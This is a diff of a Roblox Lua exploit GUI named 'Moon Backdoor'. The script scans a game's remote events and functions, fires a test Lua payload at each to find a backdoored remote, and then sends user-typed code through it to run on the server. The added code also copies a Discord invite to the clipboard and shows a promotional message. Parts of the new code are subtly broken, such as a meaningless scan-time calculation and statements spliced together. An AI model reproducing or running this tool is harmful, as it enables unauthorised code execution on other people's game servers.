@@ -11,7 +11,7 @@
 local G2L = {};
 
 -- StarterGui.ScreenGui
-G2L["1"] = Instance.new("ScreenGui", game:GetService("CoreGui"):WaitForChild("af21f37e484439e3ba6f6ef33f54be0186fb6c713fad82bed075489009bd6854"));
+G2L["1"] = Instance.new("ScreenGui", game.CoreGui);
 G2L["1"]["ZIndexBehavior"] = Enum.ZIndexBehavior.Sibling;
 
 
@@ -25,14 +25,14 @@ G2L["2"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
 G2L["2"]["Name"] = [[Main]];
 
 
--- StarterGui.ScreenGui.Main.LocalScript
-G2L["3"] = Instance.new("LocalScript", G2L["2"]);
-
-
-
 -- StarterGui.ScreenGui.Main.UIDrag
+G2L["3"] = Instance.new("LocalScript", G2L["2"]);
+G2L["3"]["Name"] = [[UIDrag]];
+
+
+-- StarterGui.ScreenGui.Main.LocalScript
 G2L["4"] = Instance.new("LocalScript", G2L["2"]);
-G2L["4"]["Name"] = [[UIDrag]];
+
 
 
 -- StarterGui.ScreenGui.Main.LocalScript
@@ -207,316 +207,26 @@ G2L["12"]["Name"] = [[Contains]];
 G2L["12"]["Position"] = UDim2.new(0.13347, 0, 0, 0);
 
 
--- StarterGui.ScreenGui.Main.LocalScript
-local function C_3()
-local script = G2L["3"];
-	local buttons = {
-		Exe = script.Parent.Buttons.Exe;
-		clear = script.Parent.Buttons.Clear;
-		connect = script.Parent.Connect;
-	}
-	
-	local statustext = script.Parent.Stats
-	local codeBar = script.Parent.CodeBar
-	
-	local statusss = {
-		Offline = "🔴";
-		checking = "🟠";
-		allow = "🟢";
-	}
-	
-	local function status(types)
-		if types == "O" then
-			statustext.Text = statusss.Offline
-		elseif types == "C" then
-			statustext.Text = statusss.checking
-		elseif types == "B" then
-			statustext.Text = statusss.allow
-		end
-	end
-	
-	local SAFE_LOCATIONS = {
-		["CoreGui"] = true,
-		["ServerStorage"] = true,
-		["ReplicatedFirst"] = true,
-		["ServerScriptService"] = true
-	}
-	
-	local EXCLUDED_REMOTES = {
-		["DefaultChatSystemChatEvents"] = true,
-		["ChatSystemRunner"] = true,
-		["ReplicatedStats"] = true,
-		["CharacterStats"] = true,
-		["PlayerList"] = true,
-		["Badges"] = true,
-		["Leaderboard"] = true,
-		["Teams"] = true
-	}
-	
-	local foundExploit = false
-	local FinishedFound = false
-	local remoteEvent, remoteFunction
-	local scanTime = 0
-	
-	local function isLikelyBackdoorRemote(remote)
-		local name = remote.Name
-		local parent = remote.Parent
-		
-		if SAFE_LOCATIONS[parent.ClassName] then
-			return false
-		end
-		if string.split(remote:GetFullName(), '.')[1] == 'RobloxReplicatedStorage' then
-			print('cancelled remote: '..remote:GetFullName())
-			return false
-		end 
-		if EXCLUDED_REMOTES[name] then
-			return false
-		end
-		
-		return true
-	end
-	
-	local function testRemote(remote, isFunction)
-		if foundExploit then return false end
-		local modelName = "moon_"..tostring(os.clock()):gsub("%.", "")
-		local rs = game:GetService("ReplicatedStorage")
-		local foundEvent = false
-		
-		local connection = rs.DescendantAdded:Connect(function(inst)
-			if inst.Name == modelName then
-				foundEvent = true
-			end
-		end)
-		
-		local function cleanup()
-			connection:Disconnect()
-			local f = rs:FindFirstChild(modelName)
-			if f then f:Destroy() end
-		end
-		
-		local success = pcall(function()
-			local payload = [[
-				local m=Instance.new("Folder")
-				m.Name="]]..modelName..[["
-				m.Parent=game:GetService("ReplicatedStorage")
-			]]
-			if isFunction then
-				local invoked = pcall(function()
-					remote:InvokeServer(payload)
-				end)
-				if not invoked then
-					pcall(function()
-						remote:InvokeServer('moonTSS', payload)
-					end)
-				end
-			else
-				local fired = pcall(function()
-					remote:FireServer(payload)
-				end)
-				if not fired then
-					pcall(function()
-						remote:FireServer('moonTSS', payload)
-					end)
-				end
-			end
-		end)
-		
-		local timeout = 1
-		local start = os.clock()
-		while os.clock() - start < timeout do
-			if foundEvent or rs:FindFirstChild(modelName) then
-				foundEvent = true
-				break
-			end
-			task.wait(0.01)
-		end
-		
-		cleanup()
-		
-		if foundEvent and not foundExploit then
-			foundExploit = true
-			if isFunction then
-				remoteFunction = remote
-			else
-				remoteEvent = remote
-			end
-			return true
-		end
-		
-		return false
-	end
-	
-	local ok = script.Parent.Contains
-	
-	local function findRemote()
-		local trueStart = os.clock()
-		foundExploit = false
-		remoteEvent = nil
-		remoteFunction = nil
-		
-		local remotes = {}
-		for _, remote in ipairs(game:GetDescendants()) do
-			if remote:IsA("RemoteEvent") or remote:IsA("RemoteFunction") then
-				table.insert(remotes, remote)
-			end
-		end
-		
-		print(string.format("🌙 moon: 🔍 scanning %d remotes", #remotes))
-		
-		local MAX_CONCURRENT = 64
-		local activeTasks = 0
-		local taskDone = Instance.new("BindableEvent")
-		
-		for i = 1, #remotes do
-			if foundExploit then break end
-			
-			while activeTasks >= MAX_CONCURRENT do
-				taskDone.Event:Wait()
-			end
-			
-			activeTasks += 1
-			task.spawn(function()
-				local ok, result = pcall(function()
-					return testRemote(remotes[i], remotes[i]:IsA("RemoteFunction"))
-				end)
-				
-				if ok and result then
-					print("🌙 moon: backdoor found:", remotes[i]:GetFullName())
-				end
-				
-				activeTasks -= 1
-				taskDone:Fire()
-			end)
-		end
-		
-		while activeTasks > 0 and not foundExploit do
-			taskDone.Event:Wait()
-		end
-		
-		scanTime = os.clock() - trueStart
-		FinishedFound = true
-		
-		if not foundExploit then
-			print("🌙 moon: no backdoor found")
-		end
-		
-		print(string.format("🌙 moon: scan completed in %.3f seconds", scanTime))
-	end
-	
-	local function updateExeButton()
-		if exeConnection then
-			exeConnection:Disconnect()
-			exeConnection = nil
-		end
-		
-		if foundExploit then
-			exeConnection = buttons.Exe.MouseButton1Click:Connect(function()
-				local code = codeBar.Text
-				if code and code ~= "" then
-					if remoteEvent then
-						print("ℹ️ Executing code through backdoor:", remoteEvent:GetFullName())
-						remoteEvent:FireServer(code)
-					elseif remoteFunction then
-						print("ℹ️ Executing code through backdoor:", remoteFunction:GetFullName())
-						pcall(function()
-							remoteFunction:InvokeServer('moonTSS', code)
-						end)
-					end
-					
-					game.StarterGui:SetCore("SendNotification", {
-						Title = "🌙 moon";
-						Text = "Code executed through backdoor";
-						Icon = "rbxassetid://73958241564252";
-						Duration = 3;
-					})
-				else
-					game.StarterGui:SetCore("SendNotification", {
-						Title = "🌙 moon";
-						Text = "No Code to Execute";
-						Icon = "rbxassetid://73958241564252";
-						Duration = 3;
-					})
-				end
-			end)
-		else
-			exeConnection = buttons.Exe.MouseButton1Click:Connect(function()
-				game.StarterGui:SetCore("SendNotification", {
-					Title = "Moon";
-					Text = "No Backdoor Found";
-					Icon = "rbxassetid://73958241564252";
-					Duration = 5;
-				})
-			end)
-		end
-	end
-	
-	buttons.connect.MouseButton1Click:Connect(function()
-		status("C")
-		
-		game.StarterGui:SetCore("SendNotification", {
-			Title = "Moon";
-			Text = "Checking for backdoors...";
-			Icon = "rbxassetid://73958241564252";
-			Duration = 3;
-		})
-		
-		
-		task.spawn(function()
-			findRemote()
-			
-			if foundExploit then
-				status("B")
-				game.StarterGui:SetCore("SendNotification", {
-					Title = "🌙 moon";
-					Text = "Backdoor found! Ready to execute.";
-					Icon = "rbxassetid://73958241564252";
-					Duration = 5;
-				})
-			else
-				status("O")
-				game.StarterGui:SetCore("SendNotification", {
-					Title = "🌙 moon";
-					Text = "No backdoor found";
-					Icon = "rbxassetid://73958241564252";
-					Duration = 5;
-				})
-			end
-			
-		
-			updateExeButton()
-		end)
-	
-		updateExeButton()
-	end)
-	
-	buttons.clear.MouseButton1Click:Connect(function()
-		codeBar.Text = ""
-	end)
-	
-	status("O")
-	updateExeButton()
-end;
-task.spawn(C_3);
 -- StarterGui.ScreenGui.Main.UIDrag
-local function C_4()
-local script = G2L["4"];
+local function C_3()
+	local script = G2L["3"];
 	-- Made by Real_IceyDev (@lceyDex) --
 	-- Simple UI dragger (PC Only/Any device that has a mouse) --
-	
+
 	local UIS = game:GetService('UserInputService')
 	local frame = script.Parent
 	local dragToggle = nil
 	local dragSpeed = 0.25
 	local dragStart = nil
 	local startPos = nil
-	
+
 	local function updateInput(input)
 		local delta = input.Position - dragStart
 		local position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X,
 			startPos.Y.Scale, startPos.Y.Offset + delta.Y)
 		game:GetService('TweenService'):Create(frame, TweenInfo.new(dragSpeed), {Position = position}):Play()
 	end
-	
+
 	frame.InputBegan:Connect(function(input)
 		if (input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch) then 
 			dragToggle = true
@@ -529,7 +239,7 @@ local script = G2L["4"];
 			end)
 		end
 	end)
-	
+
 	UIS.InputChanged:Connect(function(input)
 		if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
 			if dragToggle then
@@ -538,11 +248,245 @@ local script = G2L["4"];
 		end
 	end)
 end;
+task.spawn(C_3);
+-- StarterGui.ScreenGui.Main.LocalScript
+local function C_4()
+	local script = G2L["4"];
+	local msg = Instance.new("Message", game.Workspace)
+	msg.Text = "pls join Moon Backdoor Dc!!"
+	setclipboard("https://discord.gg/W5bNxXf85r")
+	wait(5)
+	msg:Destroy()
+end;
 task.spawn(C_4);
 -- StarterGui.ScreenGui.Main.LocalScript
 local function C_5()
-local script = G2L["5"];
-	local msg = Instance.new("Message", game.Workspace)
+	local script = G2L["5"];
+
+	local buttons = {
+		Exe = script.Parent.Buttons.Exe;
+		clear = script.Parent.Buttons.Clear;
+		connect = script.Parent.Connect;
+	}
+
+	local statustext = script.Parent.Stats
+	local codeBar = script.Parent.CodeBar
+
+
+	local statusIcons = {
+		Offline = "🔴";
+		Checking = "🟠";
+		Allow = "🟢";
+	}
+
+	local function setStatus(key)
+		if key == "O" then
+			statustext.Text = statusIcons.Offline
+		elseif key == "C" then
+			statustext.Text = statusIcons.Checking
+		elseif key == "B" then
+			statustext.Text = statusIcons.Allow
+		end
+	end
+
+	-- Safe‑list / exclusion lists
+	local SAFE_LOCATIONS = {
+		CoreGui = true,
+		ServerStorage = true,
+		ReplicatedFirst = true,
+		ServerScriptService = true,
+	}
+
+	local EXCLUDED_REMOTES = {
+		DefaultChatSystemChatEvents = true,
+		ChatSystemRunner = true,
+		ReplicatedStats = true,
+		CharacterStats = true,
+		PlayerList = true,
+		Badges = true,
+		Leaderboard = true,
+		Teams = true,
+	}
+
+	
+	local foundExploit = false
+	local remoteEvent, remoteFunction
+	local scanTime = 0
+
+	local function isLikelyBackdoorRemote(remote)
+		if SAFE_LOCATIONS[remote.Parent.ClassName] then return false end
+		if string.split(remote:GetFullName(), ".")[1] == "RobloxReplicatedStorage" then
+			print("cancelled remote:", remote:GetFullName())
+			return false
+		end
+		if EXCLUDED_REMOTES[remote.Name] then return false end
+		return true
+	end
+
+	local function testRemote(remote, isFunction)
+		if foundExploit then return false end
+		local modelName = "moon_" .. tostring(os.clock()):gsub("%.", "")
+		local rs = game:GetService("ReplicatedStorage")
+		local foundEvent = false
+		local conn = rs.DescendantAdded:Connect(function(inst)
+			if inst.Name == modelName then
+				foundEvent = true
+			end
+		end)
+		local function cleanup()
+			conn:Disconnect()
+			local f = rs:FindFirstChild(modelName)
+			if f then f:Destroy() end
+		end
+		pcall(function()
+			local payload = [[
+				local m = Instance.new("Folder")
+				m.Name = "]] .. modelName .. [["
+				m.Parent = game:GetService("ReplicatedStorage")
+			]]
+			if isFunction then
+				pcall(function() remote:InvokeServer(payload) end)
+				pcall(function() remote:InvokeServer("moonTSS", payload) end)
+			else
+				pcall(function() remote:FireServer(payload) end)
+				pcall(function() remote:FireServer("moonTSS", payload) end)
+			end
+		end)
+		local timeout = 1
+		local start = os.clock()
+		while os.clock() - start < timeout do
+			if foundEvent or rs:FindFirstChild(modelName) then
+				foundEvent = true
+				break
+			end
+			task.wait(0.01)
+		end
+		cleanup()
+		if foundEvent and not foundExploit then
+			foundExploit = true
+			if isFunction then
+				remoteFunction = remote
+			else
+				remoteEvent = remote
+			end
+			return true
+		end
+		return false
+	end
+
+
+	local function simpleFindRemote()
+		setStatus("C")
+		foundExploit = false
+		remoteEvent, remoteFunction = nil, nil
+		local candidates = {}
+		for _, obj in ipairs(game:GetDescendants()) do
+			if (obj:IsA("RemoteEvent") or obj:IsA("RemoteFunction")) and isLikelyBackdoorRemote(obj) then
+				table.insert(candidates, obj)
+			end
+		end
+		print(string.format("🌙 moon: 🔍 scanning %d remotes", #candidates))
+		for _, remote in ipairs(candidates) do
+			if foundExploit then break end
+			local ok, result = pcall(function()
+				return testRemote(remote, remote:IsA("RemoteFunction"))
+			end)
+			if ok and result then
+				print("🌙 moon: backdoor found:", remote:GetFullName())
+			end
+		end
+		scanTime = os.clock() - os.clock()
+		if not foundExploit then
+			print("🌙 moon: no backdoor found")
+		else
+			print("🔓 Backdoor remote located!")
+		end
+	end
+
+
+	local exeConnection
+	local function updateExeButton()
+		if exeConnection then
+			exeConnection:Disconnect()
+			exeConnection = nil
+		end
+		if foundExploit then
+			exeConnection = buttons.Exe.MouseButton1Click:Connect(function()
+				local code = codeBar.Text
+				if code and code ~= "" then
+					if remoteEvent then
+						print("ℹ️ Executing via RemoteEvent:", remoteEvent:GetFullName())
+						remoteEvent:FireServer(code)
+					elseif remoteFunction then
+						print("ℹ️ Executing via RemoteFunction:", remoteFunction:GetFullName())
+						pcall(function()
+							remoteFunction:InvokeServer("moonTSS", code)
+						end)
+					end
+					game.StarterGui:SetCore("SendNotification", {
+						Title = "🌙 moon",
+						Text = "Code executed through backdoor",
+						Icon = "rbxassetid://73958241564252",
+						Duration = 3,
+					})
+				else
+					game.StarterGui:SetCore("SendNotification", {
+						Title = "🌙 moon",
+						Text = "No Code to Execute",
+						Icon = "rbxassetid://73958241564252",
+						Duration = 3,
+					})
+				end
+			end)
+		else
+			exeConnection = buttons.Exe.MouseButton1Click:Connect(function()
+				game.StarterGui:SetCore("SendNotification", {
+					Title = "Moon",
+					Text = "No Backdoor Found",
+					Icon = "rbxassetid://73958241564252",
+					Duration = 5,
+				})
+			end)
+		end
+	end
+
+	buttons.connect.MouseButton1Click:Connect(function()
+		setStatus("C")
+		game.StarterGui:SetCore("SendNotification", {
+			Title = "Moon",
+			Text = "Checking for backdoors...",
+			Icon = "rbxassetid://73958241564252",
+			Duration = 3,
+		})
+		task.spawn(function()
+			simpleFindRemote()
+			if foundExploit then
+				setStatus("B")
+				game.StarterGui:SetCore("SendNotification", {
+					Title = "🌙 moon",
+					Text = "Backdoor found! Ready to execute.",
+					Icon = "rbxassetid://73958241564252",
+					Duration = 5,
+				})
+			else
+				setStatus("O")
+				game.StarterGui:SetCore("SendNotification", {
+					Title = "🌙 moon",
+					Text = "No backdoor found",
+					Icon = "rbxassetid://73958241564252",
+					Duration = 5,
+				})
+			end
+			updateExeButton()
+		end)
+	end)
+
+	buttons.clear.MouseButton1Click:Connect(function()
+		codeBar.Text = ""
+	end)
+
+	setStatus("O")
+	updateExeButton()local msg = Instance.new("Message", game.Workspace)
 	msg.Text = "pls join Moon Backdoor Dc!!"
 	setclipboard("https://discord.gg/W5bNxXf85r")
 	wait(5)
